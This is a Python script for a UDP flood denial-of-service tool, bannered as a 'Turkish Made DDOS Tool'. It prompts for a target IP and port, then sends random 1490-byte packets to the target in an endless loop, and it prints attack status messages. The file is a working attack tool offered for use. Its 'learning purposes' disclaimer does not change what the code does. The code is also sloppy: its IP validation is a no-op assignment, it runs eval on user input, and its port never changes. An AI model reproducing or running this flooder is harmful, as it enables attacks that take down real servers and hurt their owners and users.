#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''
    ************************************************
    *                                              *
    *         _____     _____ _____                *
    *         |_   _|_ _| __  |  |  |              *
    *          | | | | |    -|    -|               *
    *          |_| |___|__|__|__|__|               *
    *                                              *
    *                                              *
    *                                              *
    *          Turkish Made DDOS Tool              *
    *          Author: Unknown Destroyer           *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    *  [!] Warning :                               *
    *  1. Don't Use it to Personal Revenges        *
    *  2. I am Not Responsible For Your Jobs       *
    *  3. Use it for learning purposes             * 
    ************************************************
	''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] Give me A Target IP : ")
port = eval(input(" [+] Starting Port NO : "))
os.system("clear")
print('''
    ************************************************
    *                                              *
    *           ___    __                          *
    *             |    |__)|_/                     *
    *             | |_|| \ | \                     * 
    *                                              *
    *                                              *
    *                                              *
    *          Turkish Made DDOS Tool              *
    *          Author: Unknown Destroyer           *
    *                                              *
    ************************************************

	''')
try:
	validate = ip
	print(" ✅ Valid IP Checked.... ")
	print(" [+] Attack Screen Loading ....")
except ValidationError as exception :
	print(" ✘ Input a right url")

#Lets start our attack
print(" ")
print("    That's my secret Cap, I am always angry ")
print(" " )
print(" [+] TURK is attacking server " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C Detected.........Exiting")
	print(" [-] DDOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [-] Dr. Banner is tired...")
